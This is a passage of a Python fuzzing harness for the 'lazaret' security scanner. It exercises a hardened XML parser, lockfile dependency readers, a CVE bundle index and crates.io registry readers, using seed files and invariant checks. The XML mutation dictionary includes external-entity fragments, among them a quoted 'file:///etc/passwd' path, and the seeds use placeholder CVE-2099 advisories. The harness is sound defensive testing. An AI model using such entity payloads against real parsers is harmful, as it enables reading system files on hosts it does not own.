    b'<?xml version="1.0" encoding="ISO-8859-1"?><a>\xe9</a>',
    b"<a>" + b"<b>" * 40 + b"x" + b"</b>" * 40 + b"</a>",
    b'<a:b xmlns:a="u" a:c="d"><e xmlns="v"/></a:b>']
XML_WORDS = (b"<!DOCTYPE", b"<!ENTITY", b"<!ATTLIST", b"<!ELEMENT", b"<!NOTATION", b"SYSTEM", b"PUBLIC", b'"file:///etc/passwd"',
             b"%", b"&#x", b"&#", b"&amp;", b"<![CDATA[", b"]]>", b"<?xml", b'encoding="', b"xmlns:", b"xml:", b"<!--", b"-->",
             b'standalone="yes"', b"\xff\xfe", b"\xef\xbb\xbf", b'CDATA "', b"NDATA", b"ANY", b"EMPTY", b"#REQUIRED", b"#FIXED")
XML_OPTIONS = ({}, {"forbid_dtd": True}, {"forbid_entities": False}, {"max_depth": 6}, {"max_bytes": 512},
               {"forbid_entities": False, "max_attlist_defaults": 256}, {"forbid_external": False, "forbid_entities": False})


def xml_etree_start():
    from xml.parsers import expat

    from lazaret.safexml import ElementTree as ET
    from lazaret.safexml._common import AMPLIFICATION_FACTOR, AMPLIFICATION_THRESHOLD, SafeXMLError

    def run(data):
        options = pick(data, XML_OPTIONS)
        try:
            root = ET.fromstring(data, **options)
        except (ET.ParseError, SafeXMLError, expat.ExpatError):
            return
        check(isinstance(root.tag, str), "xml-tag-type", repr(root.tag))
        nodes = size = 0
        for element in root.iter():
            nodes += 1
            size += len(element.text or "") + len(element.tail or "") + sum(len(k) + len(v) for k, v in element.attrib.items())
        check(nodes <= len(data) // 3 + 1, "xml-node-count", f"{nodes} elements from {len(data)} bytes")
        check(size <= AMPLIFICATION_FACTOR * len(data) + 2 * AMPLIFICATION_THRESHOLD, "xml-amplification",
              f"{size} characters from {len(data)} bytes ({options})")
    return run, lambda: None


def xml_minidom_start():
    from xml.parsers import expat

    from lazaret.safexml import ElementTree as ET
    from lazaret.safexml import minidom
    from lazaret.safexml._common import SafeXMLError

    def run(data):
        try:
            minidom.parseString(data, **pick(data, XML_OPTIONS))
        except (ET.ParseError, SafeXMLError, expat.ExpatError):
            pass
    return run, lambda: None


register("xml", "safexml ElementTree.fromstring, with the options and limits the scanner can give it",
         lambda: list(XML_SEEDS), xml_etree_start, XML_WORDS, max_len=16384)
register("xml-minidom", "safexml minidom.parseString, with the same options", lambda: list(XML_SEEDS),
         xml_minidom_start, XML_WORDS, max_len=16384)


# ------------------------------------------------------------------------------------------- lockfiles

def j(value):
    return json.dumps(value, indent=2).encode("utf-8")


SCA_SEEDS = {
    "package-lock.json": [
        j({"name": "app", "lockfileVersion": 3, "packages": {
            "": {"name": "app", "dependencies": {"lodash": "^4.17.0"}},
            "node_modules/lodash": {"version": "4.17.20", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"},
            "node_modules/a/node_modules/@scope/b": {"version": "1.0.0"},
            "node_modules/alias": {"name": "real", "version": "npm:real@2.0.0"},
            "node_modules/git": {"version": "git+ssh://git@example.com/x/y.git#abc"},
            "packages/ws": {"version": "1.0.0"}, "node_modules/ws": {"link": True, "resolved": "packages/ws"}}}),
        j({"name": "app", "lockfileVersion": 1, "dependencies": {"a": {"version": "1.0.0", "dependencies": {
            "b": {"version": "2.0.0", "dependencies": {"c": {"version": "3.0.0"}}}}}, "weird": "1.0.0"}})],
    "yarn.lock": [
        b'# yarn lockfile v1\n\n\nlodash@^4.17.20, lodash@^4.17.21:\n  version "4.17.21"\n  resolved "https://x/lodash.tgz#abc"\n'
        b'  integrity sha512-x\n\n"@scope/pkg@^1.0.0":\n  version "1.2.3"\n  dependencies:\n    lodash "^4.0.0"\n',
        b'__metadata:\n  version: 6\n\n"alias@npm:real@^1.0.0":\n  version: 1.4.0\n  resolution: "real@npm:1.4.0"\n  languageName: node\n\n'
        b'"app@workspace:.":\n  version: 0.0.0-use.local\n  resolution: "app@workspace:."\n'],
    "pnpm-lock.yaml": [
        b"lockfileVersion: '9.0'\n\nimporters:\n  .:\n    dependencies:\n      lodash:\n        specifier: ^4.17.0\n        version: 4.17.21\n\n"
        b"packages:\n\n  lodash@4.17.21:\n    resolution: {integrity: sha512-x}\n\n  '@scope/pkg@1.0.0(peer@2.0.0)':\n    resolution: {integrity: sha512-y}\n\n"
        b"  pkg@https://codeload.github.com/o/r/tar.gz/abc:\n    resolution: {tarball: x}\n\nsnapshots:\n\n  lodash@4.17.21: {}\n",
        b"lockfileVersion: 5.4\n\npackages:\n\n  /lodash/4.17.21:\n    resolution: {integrity: sha512-x}\n\n  /@scope/pkg/1.0.0_peer@2.0.0:\n    dev: true\n\n"
        b"  github.com/o/r/abc:\n    name: gitpkg\n    version: 1.0.0\n"],
    "bun.lock": [
        b'{\n  "lockfileVersion": 1,\n  "workspaces": {"": {"name": "app"}},\n  "packages": {\n    // a comment\n'
        b'    "lodash": ["lodash@4.17.21", "", {}, "sha512-x"],\n    "old-lodash": ["lodash@4.17.15", "", {}, "sha512-y"],\n'
        b'    "chalk/supports-color": ["supports-color@7.2.0", "", {"dependencies": {"has-flag": "^4.0.0"}}, "sha512-z"],\n'
        b'    "ws": ["ws@workspace:packages/ws"],\n  },\n}\n'],
    "poetry.lock": [
        b'[[package]]\nname = "requests"\nversion = "2.31.0"\ndescription = "x"\noptional = false\npython-versions = ">=3.7"\n\n'
        b'[package.dependencies]\nurllib3 = ">=1.21,<3"\n\n[[package]]\nname = "Django"\nversion = "4.2"\n\n[package.source]\ntype = "git"\n'
        b'url = "https://example.com/x.git"\nreference = "main"\n\n[metadata]\nlock-version = "2.0"\ncontent-hash = "abc"\n'],
    "uv.lock": [
        b'version = 1\nrequires-python = ">=3.9"\n\n[[package]]\nname = "requests"\nversion = "2.31.0"\nsource = { registry = "https://pypi.org/simple" }\n'
        b'dependencies = [\n    { name = "urllib3" },\n]\n\n[[package]]\nname = "app"\nversion = "0.1.0"\nsource = { virtual = "." }\n'],
    "pylock.toml": [
        b'lock-version = "1.0"\ncreated-by = "x"\nrequires-python = ">=3.9"\n\n[[packages]]\nname = "requests"\nversion = "2.31.0"\n\n'
        b'[[packages.wheels]]\nname = "requests-2.31.0-py3-none-any.whl"\nurl = "https://x/requests.whl"\n\n[packages.wheels.hashes]\nsha256 = "abc"\n'],
    "Pipfile.lock": [
        j({"_meta": {"hash": {"sha256": "abc"}, "pipfile-spec": 6}, "default": {
            "requests": {"hashes": ["sha256:abc"], "version": "==2.31.0"}, "vcs": {"git": "https://example.com/x.git", "ref": "abc"},
            "loose": {"version": "*"}}, "develop": {"pytest": {"version": "==7.4.0", "markers": "python_version >= '3.7'"}}})],
    "requirements.txt": [
        b"# a comment\nrequests==2.31.0 \\\n    --hash=sha256:abc\nflask>=2.0,<3 ; python_version >= '3.8'\n-r other.txt\n-c constraints.txt\n"
        b"--index-url https://example.com/simple\ngit+https://github.com/o/r.git#egg=r\nhttps://example.com/pkg-1.0.tar.gz\n"
        b"-e .\nrequests[security,socks]~=2.0 # trailing\npkg @ https://example.com/pkg.whl\n./local/path\n"],
    "pyproject.toml": [
        b'[project]\nname = "app"\nversion = "1.0"\ndependencies = ["requests>=2", "click[extras]==8.1.0 ; python_version > \'3.8\'"]\n'
        b'optional-dependencies = { dev = ["pytest"] }\n\n[dependency-groups]\ntest = ["coverage", {include-group = "dev"}]\n\n'
        b'[tool.poetry.dependencies]\npython = "^3.9"\nflask = { version = "^2.0", extras = ["async"] }\ndjango = "4.2"\n'
        b'git = { git = "https://example.com/x.git", tag = "v1" }\n\n[tool.poetry.group.dev.dependencies]\npytest = "^7"\n'],
    "setup.py": [
        b"from setuptools import setup\nREQS = ['requests>=2', 'click']\nsetup(\n    name='x', version='1',\n    install_requires=REQS + ['six==1.16.0'],\n"
        b"    setup_requires=['wheel'],\n    extras_require={'dev': ['pytest'], 'docs': ('sphinx',)},\n    tests_require=[\"mock\" \"ito\"],\n)\n"],
    "go.mod": [
        b'module example.com/app // the module\n\ngo 1.21\n\ntoolchain go1.22.1\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.0\n'
        b'\tgolang.org/x/net v0.0.0-20220906165146-f3363e06e74c // indirect\n\t"github.com/Example/Lib/v2" v2.3.0+incompatible\n)\n\n'
        b'require gopkg.in/yaml.v3 v3\nexclude github.com/bad/mod v1.0.0\nretract [v1.0.0, v1.1.0]\n',
        b'module m\ngo 1.16\nrequire a.example/x v1.0.0\nrequire stdlib v1.0.0\nreplace a.example/x v1.0.0 => b.example/fork v1.0.1\n'
        b'replace (\n\tc.example/y => ./local\n\td.example/z v2.0.0 => ../z\n\te.example/w => e.example/w v1.2.3\n)\n'],
    "go.sum": [
        b"github.com/gin-gonic/gin v1.9.0 h1:OjyFBKICoexlu99ctXNR2gg+c5pED0TPXp0H/hDDD0Y=\n"
        b"github.com/gin-gonic/gin v1.9.0/go.mod h1:W1Zq8Lqa4hVUmOXqSxYqMuXVoI5rcnMg3LyDfxPzmZw=\n"
        b"golang.org/x/net v0.0.0-20220906165146-f3363e06e74c h1:yZzWpWdsUQfnoB4MgeUqrDmIQxF4Bx1CfEw8JBnePCw=\n"
        b"c.example/z v2.0.0+incompatible h1:abc=\nshort\n"],
    "vendor/modules.txt": [
        b"# github.com/gin-gonic/gin v1.9.0\n## explicit; go 1.16\ngithub.com/gin-gonic/gin\ngithub.com/gin-gonic/gin/binding\n"
        b"# golang.org/x/net v0.0.0-20220906165146-f3363e06e74c => golang.org/x/net v0.1.0\ngolang.org/x/net/http2\n"
        b"# a.example/x v1.0.0 => ./local/x\n# b.example/y => c.example/z v1.0.0\n"],
    "Cargo.lock": [
        b'# This file is automatically @generated by Cargo.\nversion = 3\n\n[[package]]\nname = "app"\nversion = "0.1.0"\ndependencies = [\n "serde",\n]\n\n'
        b'[[package]]\nname = "serde"\nversion = "1.0.152"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "abc"\n\n'
        b'[[package]]\nname = "fork"\nversion = "0.3.0"\nsource = "git+https://example.com/fork?branch=main#0123456789abcdef"\n\n'
        b'[[package]]\nname = "sparse"\nversion = "2.0.0"\nsource = "sparse+https://index.crates.io/"\n'],
    "Cargo.toml": [
        b'[package]\nname = "app"\nversion = "0.1.0"\n\n[dependencies]\nserde = "1.0"\nexact = "=1.2.3"\nrenamed = { package = "real", version = "0.4" }\n'
        b'fromgit = { git = "https://example.com/x", branch = "main" }\nlocal = { path = "../local" }\nws = { workspace = true }\n\n'
        b'[dev-dependencies]\ndevcrate = "=0.9.0"\n\n[build-dependencies.buildcrate]\nversion = "=0.8.0"\n\n'
        b"[target.'cfg(unix)'.dependencies]\nunixcrate = \"=3.0.0\"\n\n[workspace.dependencies]\nshared = \"=4.0.0\"\n"],
}
SCA_WORDS = (b'"version"', b'"dependencies"', b'"packages"', b'"node_modules/', b'"resolved"', b'"link": true', b'"name"', b"workspace:", b"link:",
             b"file:", b"npm:", b"git+ssh://", b"github.com/", b"@", b"=", b"==", b">=", b"~=", b"!=", b";", b"[", b"]", b"{", b"}", b"[[package]]",
             b"[tool.poetry", b"[project]", b"-r ", b"-c ", b"-e ", b"\\\n", b"\r\n", b"\xef\xbb\xbf", b"\t", b"#", b'"""', b"'''", b"\\u0000",
             b"inf", b"nan", b"1e999", b"0x", b"+", b"install_requires", b"setup(", b"**", b"*", b"lambda", b"import ",
             b"module ", b"go 1.", b"toolchain ", b"require (", b"require ", b"replace ", b"exclude ", b"retract ", b"=>", b" => ./",
             b"// indirect", b"//", b"(\n", b")\n", b"`", b"v1.0.0", b"v1", b"v0.0.0-20200101000000-abcdefabcdef", b"+incompatible",
             b"example.com/x", b"stdlib", b"h1:", b"/go.mod", b"# ", b"## explicit", b"source = ", b"registry+https://github.com/rust-lang/crates.io-index",
             b"sparse+https://index.crates.io/", b"git+https://", b"[dependencies]", b"[dev_dependencies]", b"[workspace.dependencies]",
             b"[target.'cfg(unix)'.dependencies]", b"workspace = true", b"path = ", b"git = ", b"package = ", b'"=1.2.3"', b"-rc.1", b"[[package]]\n")


def sca_start(filename):
    def start():
        from lazaret.scanner import sca
        folder = tempfile.mkdtemp(prefix="lazaret-fuzz-")
        path = os.path.join(folder, *filename.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)

        def run(data):
            with open(path, "wb") as fh:
                fh.write(data)
            warned = []
            inventory = sca.scan_all(folder, warn=lambda kind, n=1: warned.append((kind, n)))
            check(isinstance(inventory, sca.Inventory), "sca-result-type", type(inventory).__name__)
            check(len(inventory) <= len(data) + 1, "sca-entry-count", f"{len(inventory)} entries from {len(data)} bytes")
            for entry in inventory:
                check(isinstance(entry, tuple) and len(entry) == 4 and all(isinstance(x, str) for x in entry),
                      "sca-entry-shape", repr(entry)[:120])
                check(entry[0] in sca.ECOSYSTEMS and entry[1], "sca-entry-values", repr(entry)[:120])
                if entry[0] == "go":              # a module Go could fetch, at a version Go reads (or none)
                    check("." in entry[1].split("/", 1)[0], "sca-go-name", repr(entry)[:120])
                    check(not entry[2] or (entry[2].startswith("v") and sca.version_key(entry[2], "go") is not None),
                          "sca-go-version", repr(entry)[:120])
            for kind, n in warned:
                check(isinstance(kind, str) and isinstance(n, int), "sca-warning-shape", repr((kind, n)))

        def close():
            shutil.rmtree(folder, ignore_errors=True)
        return run, close
    return start


def sca_seeds(filename):
    return lambda: list(SCA_SEEDS[filename])


for _filename in SCA_SEEDS:
    register("sca-" + _filename.lower().replace("/", "-").replace(".", "-").replace("_", "-").replace("--", "-"),
             f"scanner.sca.scan_all reading {_filename}", sca_seeds(_filename), sca_start(_filename), SCA_WORDS, max_len=16384)


# ----------------------------------------------------------------------------------------------- CVE bundles

def bundle_json(*advisories, **top):
    return j(dict({"bundleVersion": 1, "generatedAt": "2026-10-01T00:00:00Z", "sources": ["osv:npm"],
                   "counts": {"advisories": len(advisories)}, "advisories": list(advisories)}, **top))


BUNDLE_DOCS = [
    bundle_json(
        {"cve": "CVE-2099-0001", "title": "lodash", "cvss": 9.8, "knownExploited": True,
         "packages": [{"name": "lodash", "ecosystem": "npm", "exact": True,
                       "ranges": [{"fromVersion": "0", "toVersion": "4.17.12", "toInclusive": False}]}]},
        {"cve": "CVE-2099-0002", "packages": [{"name": "python-urllib3", "ecosystem": None, "exact": False,
                                               "ranges": [{"fromVersion": "1.0", "toVersion": "1.26.17"}]},
                                              {"name": "Django", "ecosystem": "pypi", "exact": True, "ranges": []}]},
        {"cve": "CVE-2099-0003", "malicious": True, "packages": [{"name": "@scope/pkg", "ecosystem": "npm", "exact": True,
                                                                  "ranges": [{}]}]}),
    bundle_json({"id": "GHSA-aaaa-bbbb-cccc", "cvss": "bad", "packages": [{"name": "requests", "ecosystem": "pypi",
                                                                            "exact": True, "ranges": "no"}, None, {"name": 5}]},
                "junk", {"cve": "CVE-2099-0004", "packages": "no"}),
    bundle_json(),
]
BUNDLE_WORDS = (b'"bundleVersion"', b'"advisories"', b'"packages"', b'"exact"', b'"ranges"', b'"fromVersion"', b'"toVersion"',
                b'"toInclusive"', b'"ecosystem"', b'"npm"', b'"pypi"', b'"name"', b'"cve"', b'"id"', b'"cvss"', b'"epss"',
                b'"knownExploited"', b'"malicious"', b'"generatedAt"', b'"sources"', b'"counts"', b"null", b"true", b"false",
                b"NaN", b"Infinity", b"-1", b"1e999", b'"python-', b'"py-', b'"@', b"\\ud800", b"\\u0000", b"[[", b"{}")
INDEX_WORDS = (b"LZSCAIDX", b"\x01\x00\x00\x00", b"\x00\x00\x00\x00", b"\xff\xff\xff\xff", b"\xff" * 8, b"E\x00npm\x00",
               b"L\x00", b"x\x9c", b"x\xda", b'{"k":', b'{"n":', b'"p":[[', b'"a":{', b"]]}", b"\x00" * 16)


def index_seeds():
    from lazaret.scanner import sca_index
    out = []
    for text in BUNDLE_DOCS:
        buf = io.BytesIO()
        sca_index.dump_index(json.loads(text), buf)
        out.append(buf.getvalue())
    return out


def repair_index(data):
    """`data` with the file length and every checksum made right, so that a changed file gets past the checks that
    would refuse nearly all of them and the reader's other checks are what run."""
    from lazaret.scanner import sca_index as ix
    if len(data) < ix.HEADER.size:
        return data
    out = bytearray(data)
    f = list(ix.HEADER.unpack_from(out))
    f[1], f[2], f[3] = ix.FORMAT, 0, len(out)
    n_adv, n_keys = min(f[4], 4096), min(f[5], 4096)
    meta_off, meta_len, advtab_off, keytab_off, blobs_off = f[7:12]

    def inside(off, length):
        return 0 <= off and 0 <= length and off + length <= len(out)

    def crc(off, length):
        return zlib.crc32(bytes(out[off:off + length])) if inside(off, length) else 0

    for table_off, count, entry in ((advtab_off, n_adv, ix.ADV_ENTRY), (keytab_off, n_keys, ix.KEY_ENTRY)):
        for i in range(count):
            at = table_off + i * entry.size
            if not inside(at, entry.size):
                break
            fields = list(entry.unpack_from(out, at))
            if entry is ix.ADV_ENTRY:
                fields[2] = crc(blobs_off + fields[0], fields[1])
            else:
                fields[3] = crc(blobs_off + fields[1], fields[2])
            entry.pack_into(out, at, *fields)
    f[12] = crc(meta_off, meta_len)
    f[13] = crc(advtab_off, ix.ADV_ENTRY.size * f[4])
    f[14] = crc(keytab_off, ix.KEY_ENTRY.size * f[5])
    f[15] = 0
    f[15] = zlib.crc32(ix.HEADER.pack(*f))
    ix.HEADER.pack_into(out, 0, *f)
    return bytes(out)


def names_in(advisories):
    """The package names a bundle mentions (and a few that fold to them), to look up."""
    names = {"lodash", "python-urllib3", "urllib3", "Django", "@scope/pkg"}
    for adv in advisories:
        for pkg in adv.get("packages") or ():
            if isinstance(pkg, dict) and isinstance(pkg.get("name"), str):
                name = pkg["name"]
                names.update((name, name.lower(), name.replace("-", "_"), "python-" + name))
    return sorted(names)[:64]


def index_start():
    from lazaret.scanner import sca_index
    folder = tempfile.mkdtemp(prefix="lazaret-fuzz-")
    path = os.path.join(folder, "bundle.lzx")

    def read(data):
        with open(path, "wb") as fh:
            fh.write(data)
        try:
            bundle = sca_index.IndexedBundle.open(path)
        except ValueError:                       # the refusal the reader documents (a damaged or unknown file)
            return None
        with bundle:
            try:
                checked = bundle.verify()
            except ValueError:
                checked = None
            count = len(bundle.advisories)
            check(count <= len(data) // sca_index.ADV_ENTRY.size, "index-advisory-count", f"{count} advisories in {len(data)} bytes")
            answers, errors = {}, 0
            advisories = []
            for n in range(min(count, 200)):
                try:
                    advisories.append(bundle.advisories[n])
                except ValueError:
                    errors += 1
            for name in names_in(advisories):
                for eco in (None, "npm", "pypi"):
                    try:
                        found = bundle.advisories_for(name, eco)
                    except ValueError:
                        errors += 1
                        continue
                    check(isinstance(found, list) and all(isinstance(p, tuple) and len(p) == 2 and isinstance(p[0], dict)
                                                          and isinstance(p[1], dict) for p in found), "index-answer-shape", repr(found)[:120])
                    for adv, pkg in found:
                        check(isinstance(adv.get("cve"), str) and isinstance(pkg.get("name"), str), "index-answer-values",
                              repr((adv.get("cve"), pkg.get("name")))[:120])
                        check(any(pkg is p for p in adv["packages"]), "index-answer-package", repr(pkg)[:120])
                    answers[(name, eco)] = found
            check(not (checked is not None and errors), "index-checked-then-damaged",
                  f"{errors} lookups failed on a file that passed its check")
            return answers

    def run(data):
        for variant in (data, repair_index(data)):
            first = read(variant)
            if first is not None:
                check(read(variant) == first, "index-deterministic", "two reads of one file differ")

    def close():
        shutil.rmtree(folder, ignore_errors=True)
    return run, close


def doc_start():
    from lazaret.scanner import core, sca, sca_index

    def run(data):
        try:
            doc = core.json_loads_bounded(data.decode("utf-8"))
        except (ValueError, RecursionError):
            return
        try:
            plain = sca.CveBundle(doc)
        except ValueError:
            plain = None
        buf = io.BytesIO()
        try:
            summary = sca_index.dump_index(doc, buf)
        except ValueError:
            return                               # refused: a document the index cannot hold (NaN) or one that is no bundle
        check(plain is not None, "bundle-doc-refusal", "the index accepted a document the JSON bundle refuses")
        path = os.path.join(folder, "doc.lzx")
        with open(path, "wb") as fh:
            fh.write(buf.getvalue())
        with sca_index.IndexedBundle.open(path) as indexed:
            check(summary["warnings"] == plain.warnings.lines() == indexed.warnings.lines(), "bundle-doc-warnings",
                  repr((summary["warnings"], plain.warnings.lines())))
            check(len(indexed.advisories) == len(plain.advisories), "bundle-doc-count",
                  f"{len(indexed.advisories)} against {len(plain.advisories)}")
            check(indexed.verify()["advisories"] == len(plain.advisories), "bundle-doc-verify")
            for name in names_in(plain.advisories):
                for eco in (None, "npm", "pypi"):
                    check(indexed.advisories_for(name, eco) == plain.advisories_for(name, eco), "bundle-doc-answers",
                          repr((name, eco)))

    folder = tempfile.mkdtemp(prefix="lazaret-fuzz-")

    def close():
        shutil.rmtree(folder, ignore_errors=True)
    return run, close


register("sca-bundle-index", "scanner.sca_index.IndexedBundle on a file as given and with its checksums made right",
         index_seeds, index_start, INDEX_WORDS, max_len=16384)
register("sca-bundle-doc", "a bundle document read as CveBundle and through the indexed file: the same answers",
         lambda: list(BUNDLE_DOCS), doc_start, BUNDLE_WORDS, max_len=16384)


# ------------------------------------------------------------------------------------- registry modules (wave 2)
# Readers of what a registry sends or a package holds: crates.io's index file and `Cargo.toml`, Go's `.info` answer, checksum
# database response, `go.mod` and module zip, and the rules every module shares for names and archive member paths.
# `registry/ecosystems/base.py` documents the errors a module may raise (SpecError, FetchError, DigestError); anything else is a
# finding, and so is a message that is not a short printable sentence.

MESSAGE_LIMIT = 600


def refusal(exc, rule):
    """A documented refusal says what it refuses in a short sentence of printable text."""
    text = str(exc)
    check(text.isprintable() and len(text) <= MESSAGE_LIMIT, rule, repr(text)[:160])


def served(eco, answer):
    """-> (a `base.Fetch` for `eco`, the list of URLs it asked for), over a transport that gives `answer(url)` (bytes, or None
    for "not found"). Nothing waits and nothing opens a socket."""
    from lazaret.registry.ecosystems import base
    asked = []

    def transport(url, **kw):
        asked.append(url)
        body = answer(url)
        if body is None:
            err = base.FetchError("not found")
            err.status = 404
            raise err
        return body
    return base.Fetch(eco, transport, clock=lambda: 0.0, sleep=lambda s: None), asked


def valid_name(eco, name):
    from lazaret.registry.ecosystems import base
    try:
        return eco.check_name(name) == name
    except base.SpecError:
        return False


def valid_version(eco, version):
    from lazaret.registry.ecosystems import base
    try:
        return eco.check_version(version) == version
    except base.SpecError:
        return False


def url_text_ok(url):
    return isinstance(url, str) and bool(url) and all(0x21 <= ord(c) <= 0x7e for c in url)


# ---- crates.io: the index file of one crate
def crates_line(vers, name="fnv", yanked=False, deps=(), **extra):
    rec = {"name": name, "vers": vers, "deps": list(deps), "cksum": hashlib.sha256(vers.encode()).hexdigest(),
           "features": {"default": []}, "yanked": yanked, "v": 2}
    rec.update(extra)
    return json.dumps(rec)


def crates_dep(name, kind="normal", package=None):
    rec = {"name": name, "req": "^1", "features": [], "optional": False, "default_features": True, "target": None, "kind": kind}
    if package is not None:
        rec["package"] = package
    return rec


def crates_index(*lines):
    return ("\n".join(lines) + "\n").encode("utf-8")


CRATES_INDEX_SEEDS = [
    crates_index(crates_line("0.1.0"), crates_line("1.0.7", deps=[crates_dep("libc"), crates_dep("rand", "dev"), crates_dep("cc", "build")]),
                 crates_line("1.1.0", yanked=True), crates_line("2.0.0-rc.1"), crates_line("1.0.8+build.5", rust_version="1.56", links="native")),
    crates_index(crates_line("1.0.7", deps=[crates_dep("x", package="y"), crates_dep("z", kind=None)])),
    crates_index(crates_line("1.0.0"), crates_line("1.0.0")),
    crates_index(crates_line("1.0.0", name="other")),
    crates_index(crates_line("1.0.0", yanked=True)),
    b'{"name":"fnv","vers":"1.0.0","cksum":"' + b"a" * 64 + b'","yanked":false}\n\n\n{"name":"FNV","vers":"1.0.1","cksum":"' + b"B" * 64
    + b'","yanked":false,"deps":[{"name":"a","kind":"normal"}]}',
    b"[]\n", b"not json\n", b"",
]
CRATES_WORDS = (b'"name"', b'"vers"', b'"cksum"', b'"yanked"', b'"deps"', b'"kind"', b'"package"', b'"features"', b'"rust_version"',
                b'"links"', b'"normal"', b'"build"', b'"dev"', b'"fnv"', b"true", b"false", b"null", b"1.0.0", b"1.0.0-rc.1", b"1.0.0+b",
                b"0.0.0", b"99999999999999999999.0.0", b'"v"', b"\\u0000", b"\\ud800", b"\n", b"\r\n", b"{}", b"[]", b"NaN", b"1e999")


def crates_index_start():
    from lazaret.registry.ecosystems import base, crates
    eco = crates.Crates()
    url = "https://index.crates.io/3/f/fnv"

    def resolve(data, wanted):
        fetch, asked = served(eco, lambda u: data if u == url else None)
        return eco.resolve("fnv", wanted, fetch), fetch, asked

    def run(data):
        wanted = (None, "1.0.7", "0.1.0", "2.0.0-rc.1", "1.0.8")[zlib.crc32(data) % 5]
        try:
            res, fetch, asked = resolve(data, wanted)
        except (base.SpecError, base.FetchError) as exc:
            refusal(exc, "crates-index-message")
            return
        check(asked == [url], "crates-index-requests", asked)
        check(isinstance(res, base.Resolution) and len(res.artifacts) == 1, "crates-index-shape", type(res).__name__)
        art = res.artifacts[0]
        check(url_text_ok(art["url"]) and art["url"].startswith("https://static.crates.io/crates/"), "crates-index-url", repr(art["url"])[:120])
        check(art["container"] == "tgz" and art["artifact"] == "crate" and eco.container(art["filename"]) == "tgz", "crates-index-artifact",
              repr(art)[:160])
        check(valid_version(eco, res[0]), "crates-index-version", repr(res[0])[:80])
        if wanted is not None:
            check(res[0].split("+", 1)[0] == wanted.split("+", 1)[0], "crates-index-asked-for", f"{wanted} -> {res[0]}")
        entry = art["entry"]
        check(isinstance(entry["cksum"], str) and re.fullmatch(r"[0-9a-f]{64}", entry["cksum"]), "crates-index-cksum", repr(entry["cksum"])[:80])
        check(type(entry["yanked"]) is bool and res.info["yanked"] is entry["yanked"], "crates-index-yanked", repr(entry["yanked"]))
        if wanted is None:
            check(entry["yanked"] is False, "crates-index-latest-yanked", res[0])
        check(valid_name(eco, res.info["name"]) and res.info["name"].lower() == "fnv", "crates-index-name", repr(res.info["name"])[:80])
        check(eco.archive_root(res, art) == f"{res.info['name']}-{res[0]}/", "crates-index-root", repr(eco.archive_root(res, art))[:80])
        deps = eco.dependencies(res, fetch)
        check(isinstance(deps, tuple) and list(deps) == sorted(set(deps)) and all(valid_name(eco, d) for d in deps), "crates-index-dependencies",
              repr(deps)[:120])
        check(len(asked) == 1, "crates-index-dependencies-asked", asked)
        try:
            checked = eco.verify(data, entry, "fnv", res[0])
        except base.DigestError as exc:
            refusal(exc, "crates-index-message")
        else:
            check(checked == ("sha256", hashlib.sha256(data).hexdigest()), "crates-index-verify", repr(checked)[:80])
        again, _, _ = resolve(data, wanted)
        check(tuple(again) == tuple(res) and again.artifacts == res.artifacts and again.info == res.info, "crates-index-deterministic",
              "two resolves of one index differ")

    return run, lambda: None


# ---- crates.io: a crate's Cargo.toml
CARGO_MEMBERS = ["build.rs", "src/lib.rs", "src/main.rs", "src/bin/a.rs", "src/bin/b/main.rs", "custom/build.rs", "lib/x.rs", "bin/tool.rs",
                 "Cargo.toml", "a.rs", "src/lib/mod.rs", "tools/gen.rs", "src/bin/c/d.rs", "../x.rs", "/abs.rs"]
CARGO_SEEDS = [
    b'[package]\nname = "demo"\nversion = "1.0.0"\nedition = "2021"\n\n[dependencies]\nserde = "1"\nrand = { version = "0.8", package = "rand" }\n'
    b'\n[build-dependencies]\ncc = "1"\n\n[dev-dependencies]\ntempfile = "3"\n',
    b'[package]\nname = "macros"\nversion = "0.1.0"\nbuild = "custom/build.rs"\n\n[lib]\nproc-macro = true\npath = "lib/x.rs"\n\n[[bin]]\n'
    b'name = "tool"\npath = "bin/tool.rs"\n',
    b'[package]\nname = "nobuild"\nbuild = false\n[lib]\nproc_macro = true\n[target.\'cfg(unix)\'.dependencies]\nlibc = "0.2"\n'
    b'[target."x86_64-pc-windows-msvc".build-dependencies]\nwinres = "0.1"\n',
    b'[project]\nname = "old"\nversion = "0.0.1"\n[dependencies]\nnum = { git = "https://example.invalid/num", package = "num-traits" }\n',
    b'[package]\nname = "-bad name"\n[dependencies]\n"a b" = "1"\n"../x" = "1"\n',
    b'[package]\nbuild = "../x.rs"\n[lib]\npath = "/abs.rs"\n[[bin]]\npath = 5\n[[bin]]\n',
    b'[workspace]\nmembers = ["a", "b"]\n', b"", b"[[[[", b"= = =",
]
CARGO_WORDS = (b"[package]", b"[project]", b"[lib]", b"[[bin]]", b"[dependencies]", b"[build-dependencies]", b"[dev-dependencies]",
               b"[target.", b"proc-macro = true", b"proc_macro = true", b"build = ", b"build = false", b"path = ", b"name = ", b"package = ",
               b"\"build.rs\"", b"\"src/lib.rs\"", b"\"../", b"\"/", b"\\\\", b"[[", b"]]", b"{", b"}", b"= {", b"\"\"\"", b"'''", b"\r\n",
               b"\\u0000", b"inf", b"nan", b"1979-05-27", b".")


def crates_manifest_start():
    from lazaret.registry.ecosystems import base, crates
    eco = crates.Crates()

    def run(data):
        manifests = {"Cargo.toml": data.decode("utf-8", "replace")}
        got = eco.run_targets("crate", manifests, CARGO_MEMBERS)
        check(isinstance(got, base.RunTargets), "crates-manifest-run-type", type(got).__name__)
        for label, part in zip(got._fields, got):
            check(isinstance(part, frozenset) and part <= set(CARGO_MEMBERS), "crates-manifest-run-members", f"{label}: {sorted(part)[:3]}")
        check(not got.startup, "crates-manifest-startup", "nothing in a crate runs when it is loaded")
        declared = eco.declared("crate", manifests, CARGO_MEMBERS)
        check(isinstance(declared, base.Declared), "crates-manifest-declared-type", type(declared).__name__)
        check(declared.name is None or valid_name(eco, declared.name), "crates-manifest-name", repr(declared.name)[:80])
        deps = declared.dependencies
        check(isinstance(deps, tuple) and list(deps) == sorted(set(deps)) and len(deps) <= crates.MAX_DEPS and all(valid_name(eco, d) for d in deps),
              "crates-manifest-dependencies", repr(deps)[:120])
        check(set(declared.specs) <= set(deps) and all(v is None or (isinstance(v, str) and len(v) <= crates.MAX_SPEC) for v in declared.specs.values()),
              "crates-manifest-specs", repr(declared.specs)[:120])
